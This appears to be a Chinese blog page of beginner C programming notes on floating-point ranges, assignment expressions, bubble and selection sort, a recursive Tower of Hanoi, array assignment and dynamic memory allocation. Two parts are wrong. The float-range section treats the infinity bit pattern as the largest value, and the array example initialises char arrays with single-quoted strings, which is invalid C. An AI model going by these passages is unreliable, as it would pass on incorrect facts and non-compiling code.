<p><a href="#%E5%9F%BA%E7%A1%80%E6%8E%92%E5%BA%8F%E6%96%B9%E6%B3%95">基础排序方法</a></p>
<p><a href="#%E6%B1%89%E8%AF%BA%E5%A1%94%E9%97%AE%E9%A2%98">汉诺塔问题</a></p>
<p><a href="#%E6%95%B0%E7%BB%84%E8%B5%8B%E5%80%BC">数组赋值</a></p>
<p><a href="#%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D">动态内存分配</a></p>
<hr>
<h2 id="浮点数的数值范围"><a href="#浮点数的数值范围" class="headerlink" title="浮点数的数值范围"></a>浮点数的数值范围</h2><h3 id="浮点格式"><a href="#浮点格式" class="headerlink" title="浮点格式"></a>浮点格式</h3><p>精度和范围与数据的存储格式密切相关，所以我们先来看一看它们的存储格式：<br>对于float类型的变量，其底层的存储格式为：</p>
<table>
<thead>
<tr>
<th>符号位（S）</th>
<th>指数阶码（E）</th>
<th>尾数（F）</th>
</tr>
</thead>
<tbody><tr>
<td>1bit</td>
<td>8bit</td>
<td>23bit</td>
</tr>
</tbody></table>
<p>对于double类型的变量，底层的存储格式为：</p>
<table>
<thead>
<tr>
<th>符号位（S）</th>
<th>指数阶码（E）</th>
<th>尾数（F）</th>
</tr>
</thead>
<tbody><tr>
<td>1bit</td>
<td>11bit</td>
<td>52bit</td>
</tr>
</tbody></table>
<p>存储格式为 <code>(-1)^s * F * 2^E</code></p>
<h3 id="范围推导"><a href="#范围推导" class="headerlink" title="范围推导"></a>范围推导</h3><h4 id="float类型"><a href="#float类型" class="headerlink" title="float类型"></a>float类型</h4><p>首先看它的最大的情况，此时S&#x3D;0，F全部是0，指数域全部是1，此时32bit的值为：0111 1111 1000 0000 0000 0000 0000 0000。</p>
<p>它的精确值为：<code>+1.0*2^128</code>，对应的十进制约为：<code>3.4*10^38</code>。</p>
<p>负的无穷大就是当S&#x3D;1的时候，符号取负即可。</p>
<h4 id="double类型"><a href="#double类型" class="headerlink" title="double类型"></a>double类型</h4><p>直接给出的数表示的范围：<code>−1.7*10^308 ∼ +1.7*10^308</code></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote>
<p>正常显示的只显示精度范围内的，但实际浮点类型可以存储相当大的数据，只是不会正常显示出来而已。</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../source/images/%E9%81%97%E6%BC%8F%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94/90c1d403d3c66315cc03416f9374711.png"
                      alt="90c1d403d3c66315cc03416f9374711"
                ></p>
<hr>
<h2 id="赋值表达式与赋值语句"><a href="#赋值表达式与赋值语句" class="headerlink" title="赋值表达式与赋值语句"></a>赋值表达式与赋值语句</h2><h3 id="赋值表达式"><a href="#赋值表达式" class="headerlink" title="赋值表达式"></a>赋值表达式</h3><p>简单赋值运算符和表达式:简单赋值运算符记为“&#x3D;”。</p>
<p>由“&#x3D; ”连接的式子称为赋值表达式。其一般形式为：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">变量=表达式</span><br></pre></td></tr></table></figure></div>

<p>例如：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">x=a+b</span><br><span class="line">w=sin(a)+sin(b)</span><br><span class="line">y=i++</span><br></pre></td></tr></table></figure></div>

<p>赋值表达式的功能是计算表达式的值再赋予左边的变量。赋值运算符具有右结合性。<br>因此</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=b=c=5</span><br></pre></td></tr></table></figure></div>

<p>可理解为</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=(b=(c=5))</span><br></pre></td></tr></table></figure></div>

<p>在其它高级语言中，赋值构成了一个语句，称为赋值语句。</p>
<p>而在 C 中，把“&#x3D;”定义为运算符，从而组成赋值表达式。 凡是表达式可以出现的地方均可出现赋值表达式。<br>例如，式子:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">x=(a=5)+(b=8)</span><br></pre></td></tr></table></figure></div>

<p>是合法的。它的意义是把 5 赋予 a，8 赋予 b，再把 a,b 相加，和赋予 x，故 x 应等于 13。<br>在Ｃ语言中也可以组成赋值语句，按照Ｃ语言规定，任何表达式在其未尾加上分号就构成为语句。<br>因此如<code>x=8;a=b=c=5；</code>都是赋值语句。</p>
<h3 id="赋值语句"><a href="#赋值语句" class="headerlink" title="赋值语句"></a>赋值语句</h3><p>赋值语句是由赋值表达式再加上分号构成的表达式语句。</p>
<p>其一般形式为： </p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">变量=表达式;</span><br></pre></td></tr></table></figure></div>

<p>在赋值语句的使用中需要注意以下几点：</p>
<ol>
<li><p>由于在赋值符“&#x3D;”右边的表达式也可以又是一个赋值表达式， 因此，下述形式 变量&#x3D;(变量&#x3D;表达式); 是成立的，从而形成 嵌套的情形。 其展开之后的一般形式为：变量&#x3D;变量&#x3D;…&#x3D;表达式; 例如： a&#x3D;b&#x3D;c&#x3D;d&#x3D;e&#x3D;5; 按照赋值运算符的右接合性，因此实际上等效于： e&#x3D;5; d&#x3D;e; c&#x3D;d; b&#x3D;c; a&#x3D;b;</p>
</li>
<li><p>注意在变量说明中给变量赋初值和赋值语句的区别。 给变量赋初值是变量说明的一部分，赋初值后的变量与其后的其它同类变量之间仍必须用逗号间隔，而赋值语句则必须用分号结尾。 例如： int a&#x3D;5,b,c;</p>
</li>
<li><p>在变量说明中，不允许连续给多个变量赋初值。 如下述说明是错误的： int a&#x3D;b&#x3D;c&#x3D;5 必须写为 int a&#x3D;5,b&#x3D;5,c&#x3D;5; 而赋值语句允许连续赋值。</p>
</li>
<li><p>注意赋值表达式和赋值语句的区别。 赋值表达式是一种表达式，它可以出现在任何允许表达式出现的地方，而赋值语句则不能。</p>
</li>
</ol>
<p>下述语句是合法的：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if((x=y+5)&gt;0) z=x;</span><br></pre></td></tr></table></figure></div>

<p>这里(x&#x3D;y+5)是赋值表达式，语句的功能是，若表达式x&#x3D;y+5大于0则z&#x3D;x。</p>
<p>下述语句是非法的：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if((x=y+5;)&gt;0) z=x;</span><br></pre></td></tr></table></figure></div>

<p>因为x&#x3D;y+5;是语句，不能出现在表达式中。</p>
<hr>
<h2 id="基础排序方法"><a href="#基础排序方法" class="headerlink" title="基础排序方法"></a>基础排序方法</h2><h3 id="冒泡排序（两两互换）"><a href="#冒泡排序（两两互换）" class="headerlink" title="冒泡排序（两两互换）"></a>冒泡排序（两两互换）</h3><p>冒泡排序是交换排序中一种简单的排序方法。</p>
<p>它的基本思想是对所有相邻记录的关键字值进行比效，如果是逆顺（a[j]&gt;a[j+1]），则将其交换，最终达到有<br>序化;</p>
<p>其处理过程为： </p>
<p>（1）将整个待排序的记录序列划分成有序区和无序区，初始状态有序区为空，无序区包括所有待排序的记<br>录。 </p>
<p>（2）对无序区从前向后依次将相邻记录的关键字进行比较，若逆序将其交换，从而使得关键字值小的记录向<br>上”飘浮”（左移），关键字值大的记录好像石块，向下“堕落”（右移）。 每经过一趟冒泡排序，都使无序区中<br>关键字值最大的记录进入有序区，对于由n个记录组成的记录序列，最多经过n-1趟冒泡排序，就可以将这n个记<br>录重新按关键字顺序排列。</p>
<blockquote>
<p>原始的冒泡排序算法 对由n个记录组成的记录序列，最多经过（n-1）趟冒泡排序，就可以使记录序列成为<br>有序序列，第一趟定位<strong>第n个</strong>记录，此时有序区只有一个记录；第二趟定位<strong>第n-1个</strong>记录，此时有序区有两个记<br>录；以此类推，算法框架为： for（i&#x3D;n；i&gt;1；i—） { 定位第i个记录；}</p>
</blockquote>
<p>代码如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">int</span> data[<span class="number">5</span>];</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;请输入数据：\n&quot;</span>);</span><br><span class="line">   <span class="type">int</span> i,j;</span><br><span class="line">   <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; <span class="number">5</span>;i ++)</span><br><span class="line">   &#123;</span><br><span class="line">   	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;data[i]);	<span class="comment">//输入数据 </span></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; <span class="number">5</span>;i ++)  <span class="comment">//采用双重循环 </span></span><br><span class="line">   &#123;</span><br><span class="line">   	<span class="keyword">for</span>(j = <span class="number">0</span>;j &lt; <span class="number">5</span> - <span class="number">1</span> - i;j++)</span><br><span class="line">   	&#123;</span><br><span class="line">   	  <span class="keyword">if</span>(data[j] &gt; data[j+<span class="number">1</span>])     <span class="comment">//这里默认采用升序来排列 </span></span><br><span class="line">		 &#123;</span><br><span class="line">		 	<span class="type">int</span> temp;        <span class="comment">//定义一个临时值来存储数据，以此来达到交换数值的目的</span></span><br><span class="line">			temp = data[j];</span><br><span class="line">			data[j] = data[j+<span class="number">1</span>];</span><br><span class="line">			data[j+<span class="number">1</span>] = temp;</span><br><span class="line">		 &#125;	</span><br><span class="line">	&#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;排序好的数组为：\n&quot;</span>);</span><br><span class="line">   <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; <span class="number">5</span>;i ++)    <span class="comment">//用for循环来遍历并输出排序完成的数组 </span></span><br><span class="line">   &#123;</span><br><span class="line">   	 <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,data[i]);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>

<h3 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h3><h4 id="一、什么是选择排序？"><a href="#一、什么是选择排序？" class="headerlink" title="一、什么是选择排序？"></a>一、什么是选择排序？</h4><p> 选择排序（Selection sort）是一种简单直观的排序算法。它的工作原理是：第一次从待排序的中数据元素选出最小（或最大）的一个元素，存放在序列的起始位置，然后再从剩余的未排序元素中寻找到最小（大）元素，然后放到已排序的序列的末尾。以此类推，直到全部待排序的数据元素的个数为零。选择排序是不稳定的排序方法。</p>
<h4 id="二、选择排序思路"><a href="#二、选择排序思路" class="headerlink" title="二、选择排序思路"></a>二、选择排序思路</h4><p>首先在未排序序列中找到最小（大）元素，存放到排序序列的起始位置，然后，再从剩余未排序元素中继续寻找最小（大）元素，然后放到已排序序列的末尾。以此类推，直到所有元素均排序完毕。</p>
<h4 id="三、排序过程"><a href="#三、排序过程" class="headerlink" title="三、排序过程"></a>三、排序过程</h4><p>例：定义一个数组 int a[8] &#x3D; {9，3，7，2，6，1，5，8}，要求利用选择排序的方法将数组从小到大排序。</p>
<p>排序的次数：因为每排好一个元素，那么所需要排的元素个数减一，直到排到倒数第二个元素停止，将倒数第二个元素也排好后，整体数组排序就完成了。<strong>所以排序的次数 &#x3D; 元素个数 - 1。(冒泡排序的排序次数与该排序的排序次数计算方法相同)</strong></p>
<blockquote>
<p>9，3，7，2，6，1，5，8</p>
</blockquote>
<p>第一次排序：假设首元素作为整体元素数据最小值，然后从该元素的后一个元素开始每个元素都与该最小值进行比较，假如有比该元素小的值，<strong>就用一个变量去记住下标值</strong>，最后比较完成后，把两个元素互换位置即可。</p>
<p>第一次排序结果：</p>
<blockquote>
<p>1，3，7，2，6，9，5，8</p>
</blockquote>
<p>第二次排序：因为第一次排序选择的是将首元素作为最小值，最终经过互换位置，首元素排序完成，第二次排序就不需要排序首元素，只需要排序除首元素以外的元素，然后在依照第一次排序的原理进行排序。</p>
<p>第二次排序结果：</p>
<blockquote>
<p>1，2，7，3，6，9，5，8</p>
</blockquote>
<p>然后根据第一次排序和第二次排序的原理，最终的排序结果为：{1，2，3，5，6，7，8，9}</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">arr_out</span><span class="params">(<span class="type">int</span> a[<span class="number">8</span>])</span><span class="comment">//输出函数</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; <span class="number">8</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">arr_sort</span><span class="params">(<span class="type">int</span> *p,<span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line">    <span class="type">int</span> min = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; n - <span class="number">1</span>;i++)<span class="comment">//排序次数</span></span><br><span class="line">    &#123;</span><br><span class="line">        min = i;</span><br><span class="line">        <span class="keyword">for</span>(j = i + <span class="number">1</span>;j &lt; n;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(p[j] &lt; p[min])</span><br><span class="line">            &#123;</span><br><span class="line">                min = j;<span class="comment">//记录交换的元素下标值</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(i != min)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> temp = p[i];</span><br><span class="line">            p[i] = p[min];</span><br><span class="line">            p[min] = temp;</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; <span class="number">8</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">arr_sort(a,<span class="number">8</span>);<span class="comment">//排序函数</span></span><br><span class="line">arr_out(a);<span class="comment">//输出函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<hr>
<h2 id="汉诺塔问题"><a href="#汉诺塔问题" class="headerlink" title="汉诺塔问题"></a>汉诺塔问题</h2><p>&#x3D;&#x3D;（递归）&#x3D;&#x3D;</p>
<h3 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h3><p>汉诺塔问题是一个经典的问题。汉诺塔（Hanoi Tower），又称河内塔，源于印度一个古老传说。大梵天创造世界的时候做了三根金刚石柱子，在一根柱子上从下往上按照大小顺序摞着64片黄金圆盘。大梵天命令婆罗门把圆盘从下面开始按大小顺序重新摆放在另一根柱子上。并且规定，任何时候，在小圆盘上都不能放大圆盘，且在三根柱子之间一次只能移动一个圆盘。问应该如何操作？</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../source/images/%E9%81%97%E6%BC%8F%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94/3962f9684ac18a8b980c9b2f2ce63bb6.png"
                      alt="3962f9684ac18a8b980c9b2f2ce63bb6"
                ></p>
<h3 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h3><p>思路：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用的语言：C语言</span><br><span class="line">使用的编译器：vs2019</span><br><span class="line">参考书籍：谭浩强第四版</span><br><span class="line">主要使用的知识：函数的递归</span><br><span class="line">代码实现的思路主要分为三步：</span><br></pre></td></tr></table></figure></div>

<p>假设总共需要移动n个盘子</p>
<blockquote>
<p>F(n)&#x3D;2F(n-1)+1 可以推到出需要移动2^n-1^次</p>
</blockquote>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">将A柱上的n-1个盘子借助C柱移向B柱</span><br><span class="line">将A柱上仅剩的最后一个盘子移向C柱</span><br><span class="line">将B柱上的n-1个盘子借助A柱移向C柱</span><br></pre></td></tr></table></figure></div>

<h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">move</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%c-&gt;%c\n&quot;</span>, x, y);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">hanoi</span><span class="params">(<span class="type">int</span> n, <span class="type">char</span> a, <span class="type">char</span> b, <span class="type">char</span> c)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (n == <span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		move(a, c);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		hanoi(n - <span class="number">1</span>, a, c, b);<span class="comment">//将A座上的n-1个盘子借助C座移向B座</span></span><br><span class="line">		move(a, c);<span class="comment">//将A座上最后一个盘子移向C座</span></span><br><span class="line">		hanoi(n - <span class="number">1</span>, b, a, c);<span class="comment">//将B座上的n-1个盘子借助A座移向C座</span></span><br><span class="line">	&#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//move中的实参与hanoi函数中的形参相对应，而hanoi函数中形参a，b，c所对应的值也是在有规律的变化</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">	hanoi(n, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<hr>
<h2 id="数组赋值"><a href="#数组赋值" class="headerlink" title="数组赋值"></a>数组赋值</h2><h3 id="直接赋值"><a href="#直接赋值" class="headerlink" title="直接赋值"></a>直接赋值</h3><p>数组赋值可以在定义的时候直接赋值，例：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> arr[]=<span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="type">char</span> arr[<span class="number">10</span>]=<span class="string">&#x27;world&#x27;</span>;</span><br></pre></td></tr></table></figure></div>

<h3 id="循环赋值"><a href="#循环赋值" class="headerlink" title="循环赋值"></a>循环赋值</h3><p>在定义数组后，用循环进行对数组中的值进行赋值，例：</p>
<h4 id="下标赋值"><a href="#下标赋值" class="headerlink" title="下标赋值"></a>下标赋值</h4><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a[<span class="number">10</span>];</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="指针赋值"><a href="#指针赋值" class="headerlink" title="指针赋值"></a>指针赋值</h4><p>指针赋值结束后定义的指针会出现偏移而不是最开始指向的数组头地址，用<code>p = &amp;a[0];</code>将指针改回去</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a[<span class="number">10</span>];</span><br><span class="line"><span class="type">int</span> *p=a;	<span class="comment">//int *p=&amp;a[0];</span></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,p++);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="动态内存分配"><a href="#动态内存分配" class="headerlink" title="动态内存分配"></a>动态内存分配</h2><p><strong>（<a class="link"   href="https://blog.csdn.net/TheWhiteFox/article/details/108502906" >此处挪用CSDN博主的文章 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>）</strong></p>
<h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc()"></a>malloc()</h3><p>malloc（）找到可用内存中一个大小适合的块。<br>内存是匿名的；</p>
<p>也就是说，malloc（）分配了内存，但没有为它指定名字。<br>然而，它却可以<code>返回那块内存第一个字节的地址</code>。<br>因此，可以把<code>那个地址赋值给一个指针变量</code>，并使用该指针来访问那块内存。<br>因为char代表一个字节，所以传统上曾将malloc（）定义为指向char的指针类型。</p>
<p>然而，ANSIC标准使用了一个新类型：指向void的指针。这一类型被用作“通用指针”。<br>函数malloc（）可用来返回数组指针、结构指针等等，因此一般需要把返回值的类型指派为适当的类型。</p>
<p>在ANSIC中，为了程序清晰应对指针进行类型指派，但将void 指针值赋值给其他类型的指针并不构成类型冲突。<br>如果malloc（）找不到所需的空间，它将返回空指针。<br>我们使用malloc（）来创建一个 数组。可以在程序运行时使用malloc（）请求一个存储块，另外还需要一个指针来存放该块在内存中的位置。</p>
<p>例如，如下代码：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">double</span> * ptd;</span><br><span class="line">ptd = (<span class="type">double</span> * ) <span class="built_in">malloc</span> (<span class="number">30</span> * <span class="keyword">sizeof</span>(<span class="type">double</span>));</span><br></pre></td></tr></table></figure></div>

<p><strong>这段代码请求30个double类型值的空间，并且把ptd指向该空间所在位置。</strong></p>
<blockquote>
<p>注意:ptd是作为指向一个double类型值的指针声明的，而不是指向30个double类型值的数据块的指针。</p>
</blockquote>
<blockquote>
<p>记住：数组的名字是它第一个元素的地址。</p>
</blockquote>
<p>因此，如果令ptd指向一个内存块的第一个元素，就可以像使用数组名一样使用它。<br>也就是说，可以使用表达式ptd[0]来访问内存块的第一个元素，pd[1]来访问第二个元素，依此类推。<br>正如前面所学，可以在指针符号中使用数组名，也可以在数组符号中使用指针。</p>
<p>现在，创建一个数组有三种方法：<br>1.声明一个<code>数组</code>，声明时用常量表达式指定数组维数，然后可以用数组名访问数组元素。<br>2.声明一个<code>变长数组</code>，声明时用变量表达式指定数组维数，然后用数组名来访问数组元素（这是C99的一个特性）。<br>3.声明一个<code>指针</code>，调用malloc（），然后使用该指针来访问数组元素。</p>
<p>使用第二种或第三种方法可以做一些用普通的数组声明做不到的事：</p>
<p>创建一个动态数组（dynamic array），即一个在程序运行时才分配内存并可在程序运行时选择大小的数组。</p>
<p>例如，假定n是一个整数量。在C99之前，不能这样做：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">double</span> item[n]：<span class="comment">/*如果n是一个变量，C99之前不允许这样做*/</span></span><br></pre></td></tr></table></figure></div>

<p>然而，即使在C99之前的编译器中，也可以这样做：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">ptd =（<span class="type">double</span>*）<span class="built_in">malloc</span>（n*<span class="keyword">sizeof</span>（<span class="type">double</span>））；<span class="comment">/*可以*/</span></span><br></pre></td></tr></table></figure></div>

<p>这行得通，而且正如您将看到的那样，这样做比使用一个变长数组更灵活。</p>
<p>一般地，对应每个malloc（）调用，应该调用一次free（）。<br><code>函数free（）的参数是先前malloc（）返问的地址</code>，它释放先前分配的内存。</p>
<p>这样，所分配内存的持续时间从调用malloc（）分配内存开始，到调用free（）释放内存以供再使用为止。</p>
<p>设想malloc（）和free（）管理着一个内存池。<br>每次调用malloc（）分配内存给程序使用，每次调用free（）将内存归还到池中，使内存可被再次使用。</p>
<blockquote>
<p>注意</p>
</blockquote>
<ul>
<li>free（）的参数应是一指针，指向由malloc（）分配的内存块；</li>
<li>其他方式（例如声明一个数组）分配的内存是不能使用free（）去释放的。</li>
</ul>
<p>在头文件stdlib.h中有malloc（）和free（）的原型。（我不知道，哈哈）</p>
<p>通过使用malloc（），程序可以在运行时决定需要多大的数组并创建它。</p>
<p>程序清单12.14 举例证明了这可能。</p>
<p>它把内存块地址赋给指针ptd，接着以使用数组名的方式使用ptd。</p>
<p>程序还调用了exit（）函数。该函数的原型在 stdlib.h 中，用来在内存分配失败时结束程序。</p>
<ul>
<li><p>值 EXIT_FAILURE 也在这个头文件中定义。标准库提供了两个保证能够在所有操作系统下工作的返回值：</p>
<p>EXIT SUCCESS（或者，等同于0）指示程序正常终止;</p>
<p>EXIT_FAILURE指示程序异常终止。</p>
</li>
</ul>
<p>另外，有些操作系统，包括UNIX、Linux 和Windows，能够接受其他的整数值。</p>
<h3 id="free"><a href="#free" class="headerlink" title="free()"></a>free()</h3><p>在编译程序时，静态变量的数量是固定的：在程序运行时也不改变。</p>
<p>自动变量使用的内存数量在程序执行时自动增加或者减少。<br>但被分配的内存所使用内存数量只会增加，除非您记得使用free（）。</p>
<blockquote>
<p>如果不适当使用，容易造成内存泄漏（memory leak）</p>
</blockquote>
<h3 id="calloc"><a href="#calloc" class="headerlink" title="calloc()"></a>calloc()</h3><p>内存分配还可以使用calloc（）。</p>
<p>典型的应用如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> * newmen;</span><br><span class="line">newmen = (<span class="type">long</span> *) <span class="built_in">calloc</span> (<span class="number">100</span>, <span class="keyword">sizeof</span>( <span class="type">long</span>)); </span><br></pre></td></tr></table></figure></div>

<p>与 malloc（）类似，calloc（）在ANSI以前的版本中返回一个 char 指针，在ANSI中返回一个void指针。<br>如果要存储不同类型，应该使用类型指派运算符。<br>这个新函数接受两个参数，都应是无符号的整数（在ANSI中是size_t类型）。</p>
<p>第一个参数是<code>所需内存单元的数量</code>，第二个参数是<code>每个单元以字节计的大小</code>。</p>
<p>在这里，long使用4个字节，因此这一指令建立了100个4字节单元，总共使用400个字节来存储。</p>
<p>使用 sizeof（long）而不是 4 使代码更具可易移植性。<br>它可在其他系统中运行，这些系统中 long不是4字节而是别的大小。</p>
<p>函数calloc（）还有一个特性：相当于空数组初始化<br>它将块中的全部位都置为0（然而要注意，在某些硬件系统中，浮点值0不是用全部位为0来表示的）。</p>
<h3 id="动态内存分配与变长数组"><a href="#动态内存分配与变长数组" class="headerlink" title="动态内存分配与变长数组"></a>动态内存分配与变长数组</h3><p><code>变长数组（Variable-Length Array，VLA）</code>与<code>malloc（）</code>在功能上有些一致。例如，它们都可以用来创建一个大小在运行时决定的数组：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">valmal</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	<span class="type">int</span> * pi;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"></span><br><span class="line">pi = (<span class="type">int</span> *) <span class="built_in">malloc</span>(n*<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"><span class="type">int</span> ar[n];<span class="comment">//变长数组 </span></span><br><span class="line"></span><br><span class="line">pi[<span class="number">2</span>] = ar[<span class="number">2</span>] = <span class="number">-5</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>一个区别在于 VLA 是自动存储的。</p>
<p>自动存储的结果之一就是 VLA 所用内存空间在运行完定义部分之后会自动释放。</p>
<p>在本例中，就是函数 vlamal（）终止的时候。因此不必使用 free（）。</p>
